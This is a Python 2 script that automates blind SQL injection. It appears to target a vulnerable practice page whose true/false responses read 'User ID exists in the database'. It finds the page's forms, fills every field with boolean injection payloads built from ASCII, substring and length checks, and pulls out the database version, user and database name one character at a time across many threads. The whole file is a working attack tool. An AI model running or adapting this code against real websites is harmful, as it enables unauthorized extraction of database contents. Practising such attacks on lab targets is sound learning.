# detect SQL injection
# detect_columns
# detect_columns_names

import threading
import requests
import colorama
from bs4 import BeautifulSoup
import urllib
from queuelib import queue
Page_false = '<pre>User ID is MISSING from the database.</pre>'
Page_true = 'User ID exists in the database.'
q = queue.deque

versionDB = ''


def getForm(urlInput,payload,_session):
    # xss
    r = _session.get (urlInput)
    # get all form
    parseHTML = BeautifulSoup (r.content, "lxml")

    htmlForm = parseHTML.find_all('form')

    formArr = []

    for x in htmlForm:
        formArr.append(x)

    #chen moi form mot payload va tra ve string
    payloadArr = []
    for x in formArr:
        inputs = x.find_all('input')
        # if inputs:
        #     print inputs
        # lay tat ca the input trong form
        payString = urlInput
        dem = 0
        if inputs :
            for y in inputs:
                # lay ten cua the input
                temp = ''
                if dem == 0:
                    temp = '?'
                else:
                    temp = '&'

                name = y.attrs['name']
                if name == 'Submit':
                    payload = 'Submit'
                payString = payString + temp + name + '=' + payload
                dem = 1

            payloadArr.append (payString)

    return payloadArr

def openUrl(url,asci,session):
    global versionDB
    global Page_true
    # if asci==53:
    #     print url
    if Page_true in session.get(url).content:
        versionDB += chr (asci)
        print  colorama.Fore.LIGHTYELLOW_EX+"[!] -> Version: " + versionDB +colorama.Fore.RESET

def openUrl1(url,asci,session):
    global Page_true
    if Page_true in session.get(url).content:
        return True

def detect_version(url,session):
    payloadArray = ["@@version","user()","database()"]
    global versionDB
    for pt in payloadArray:
        versionDB=''
        print 20*'-'+" "+pt+" "+20*'-'
        payload = "' or (ASCII(substring(payload,xxx,1)))=vanchon#"
        plen = "' or length(payload)=vanchon#"
        payload = payload.replace("payload",pt)
        plen = plen.replace("payload",pt)
        # check so luong
        lengthVersion = 1
        while (1):
            plent = plen.replace ('vanchon', str (lengthVersion))
            try:
                urlpl = getForm (url, urllib.quote_plus (plent), session)[0]
                if openUrl1 (urlpl, urllib.quote_plus (plen), session):
                    break
            except Exception, e:
                print e.message
            lengthVersion += 1

        print "[!] -> Length version: " + str (lengthVersion)

        for t in xrange (1, lengthVersion + 1):
            payloadt1 = payload.replace ('xxx', str (t))
            # print payloadt1

            for x in xrange (32, 126):
                payloadt = payloadt1.replace ('vanchon', str (x))
                try:
                    urlp = getForm (url, urllib.quote_plus (payloadt), session)[0]
                    t = threading.Thread (target=openUrl, args=[urlp, x, session])
                    t.start ()
                except Exception, e:
                    print e.message